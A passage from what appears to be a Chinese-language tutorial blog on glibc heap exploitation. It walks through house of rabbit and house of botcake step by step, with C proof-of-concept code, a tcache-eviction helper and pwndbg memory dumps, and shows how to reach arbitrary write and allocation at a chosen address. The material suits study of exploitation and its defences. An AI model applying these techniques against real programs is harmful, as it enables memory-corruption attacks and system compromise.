145, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6030b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 10620753, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021 &lt;==== fast</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000091 &lt;==== small</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51 &lt;==== top chunk</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="3-在-bss-段构造-fake-chunk"><a href="#3-在-bss-段构造-fake-chunk" class="headerlink" title="3 在 .bss 段构造 fake_chunk"></a>3 在 .bss 段构造 fake_chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gbuf[<span class="number">0</span>] = <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x10</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0x21</span>;</span><br><span class="line">gbuf[<span class="number">7</span>] = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x6020f0-0x20</span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0xfffffffffffffff00x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000x0000000000000021 &lt;==== fake chunk</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110 &lt;gbuf+48&gt;:0x00000000000000000x0000000000000001</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="4-通过其他漏洞改写fast-chunk指向fake-chunk"><a href="#4-通过其他漏洞改写fast-chunk指向fake-chunk" class="headerlink" title="4 通过其他漏洞改写fast chunk指向fake chunk"></a>4 通过其他漏洞改写fast chunk指向fake chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x6020f0 (gbuf+16) ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000 &lt;==== 改写fastbin指向</span><br><span class="line">0x603020:0x00000000000000000x0000000000000091</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="5-调用-malloc-consolidate，Free-和top相邻的-small-chunk-将-fake-chunk1插入-unsorted-bins-链表"><a href="#5-调用-malloc-consolidate，Free-和top相邻的-small-chunk-将-fake-chunk1插入-unsorted-bins-链表" class="headerlink" title="5 调用 malloc_consolidate，Free 和top相邻的 small chunk , 将 fake_chunk1插入 unsorted bins 链表"></a>5 调用 malloc_consolidate，Free 和top相邻的 small chunk , 将 fake_chunk1插入 unsorted bins 链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000a21001 &lt;==== fast chunk size改变</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000a20fe1 &lt;==== small chunk size改变</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="6-申请一个超大-chunk，fake-chunk1将链接到-largebin，修改fake-chunk1-size"><a href="#6-申请一个超大-chunk，fake-chunk1将链接到-largebin，修改fake-chunk1-size" class="headerlink" title="6 申请一个超大 chunk，fake_chunk1将链接到 largebin，修改fake_chunk1 size"></a>6 申请一个超大 chunk，fake_chunk1将链接到 largebin，修改fake_chunk1 size</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"></span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 10485777, </span><br><span class="line">  fd = 0x6020f0 &lt;gbuf+16&gt;, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0xa20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x1003010 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 135153, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x80000: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd2348 (main_arena+2088) ◂— 0x6020f0</span><br><span class="line">pwndbg&gt; x/30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000a00011</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000a20fe1</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0xfffffffffffffff00x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000xfffffffffffffff1 &lt;==== 修改fake chunk size</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00007ffff7dd23480x00007ffff7dd2348</span><br><span class="line">0x602110 &lt;gbuf+48&gt;:0x00000000006020f00x00000000006020f0</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="7-覆写可控内存，达到内存任意写"><a href="#7-覆写可控内存，达到内存任意写" class="headerlink" title="7 覆写可控内存，达到内存任意写"></a>7 覆写可控内存，达到内存任意写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x602080-0x10</span><br><span class="line">0x602070:0x00000000000000000x0000000000000021</span><br><span class="line">0x602080 &lt;target&gt;:0x212164656b6361480x00007ffff7dd1b00</span><br><span class="line">0x602090 &lt;target+16&gt;:0x00000000000000000x0000000000000051</span><br><span class="line">0x6020a0 &lt;target+32&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0 &lt;stdout@@GLIBC_2.2.5&gt;:0x00007ffff7dd26200x0000000000000000</span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0x00000000000000500x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000xffffffffffffff81</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00007ffff7dd23480x00007ffff7dd2348</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/29/b9ZesHUO6zIApnC.png" alt="image.png"></p><h3 id="Glibc-2-26"><a href="#Glibc-2-26" class="headerlink" title="Glibc 2.26"></a>Glibc 2.26</h3><p>从Glibc2.26开始加入了tcache，可通过以下代码绕过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(GLIBC_VERSION) &amp;&amp; (GLIBC_VERSION &gt;= 26)</span></span><br><span class="line">p = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>(GLIBC_VERSION &lt; 29)</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">void</span>**)p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (GLIBC_VERSION == 29)</span></span><br><span class="line"><span class="keyword">char</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">uint16_t</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">counts[(size + <span class="number">0x10</span> &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>house of rabbit漏洞可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的效果，因此在存在sh的文件中可直接getshell。</p><h2 id="House-of-botcake"><a href="#House-of-botcake" class="headerlink" title="House_of_botcake"></a>House_of_botcake</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>house of botcake利用手法只需要程序存在double free即可。</p><p>首先填充 tcache bin 链表，然后使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表，然后利用堆块重叠将double free块的fd指针覆写为目标位置，再次malloc即可控制到目标位置，达到任意写操作。</p><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"House of botcake Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//禁用缓冲并使_FILE_IO不影响堆</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"目标地址是 %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"堆布局构造"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"为之后的合并申请一个 prev chunk"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请用于double free的 victim chunk."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请一个填充chunk防止top chunk合并.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"接下来可以造成堆块重叠"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: 填充 tcache bin 链表"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free victim chunk 并链接到 unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free prev chunk 使它和 victim chunk 合并."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"double free 利用完成\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tcache 毒化"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"将 victim chunk 的 fd 指针覆写为目标位置"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"malloc申请到目标位置."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"新申请的 chunk 位于 %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已控制目标位置!\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/29/ZhXN3Cfeyg6SvY7.png" alt="image.png"></p><h3 id="分步分析-1"><a href="#分步分析-1" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-堆内布局构造"><a href="#1-堆内布局构造" class="headerlink" title="1 堆内布局构造"></a>1 堆内布局构造</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50xg 0x555555559f20-0x20</span><br><span class="line">                       ...</span><br><span class="line">0x555555559f00:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f10:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f20:0x00000000000000000x0000000000000111 &lt;==== victim chunk</span><br><span class="line">0x555555559f30:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f40:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f50:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f60:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f70:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f80:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f90:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fa0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fb0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fc0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fd0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fe0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a000:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a030:0x00000000000000000x0000000000000021 &lt;==== 防止合并</span><br><span class="line">0x55555555a040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a050:0x00000000000000000x000000000001ffb1 &lt;==== top chunk</span><br><span class="line">0x55555555a060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="2-填充-tcache-bin-链表"><a href="#2-填充-tcache-bin-链表" class="headerlink" title="2 填充 tcache bin 链表"></a>2 填充 tcache bin 链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line"><span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br></pre></td></tr></table></figure><h4 id="3-free-victim-chunk-并链接到-unsorted-bin"><a href="#3-free-victim-chunk-并链接到-unsorted-bin" class="headerlink" title="3 free victim chunk 并链接到 unsorted bin"></a>3 free victim chunk 并链接到 unsorted bin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559f20 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559f20</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><h4 id="4-free-prev-chunk-使它和-victim-chunk-合并"><a href="#4-free-prev-chunk-使它和-victim-chunk-合并" class="headerlink" title="4 free prev chunk 使它和 victim chunk 合并"></a>4 free prev chunk 使它和 victim chunk 合并</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559e10 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559e10    &lt;====== 合并</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><h4 id="5-使用malloc从tcache-bin链表中取出一个chunk，double-free将-victim-chunk-加入tcache-bin链表"><a href="#5-使用malloc从tcache-bin链表中取出一个chunk，double-free将-victim-chunk-加入tcache-bin链表" class="headerlink" title="5 使用malloc从tcache bin链表中取出一个chunk，double free将 victim chunk 加入tcache bin链表"></a>5 使用malloc从tcache bin链表中取出一个chunk，double free将 victim chunk 加入tcache bin链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span 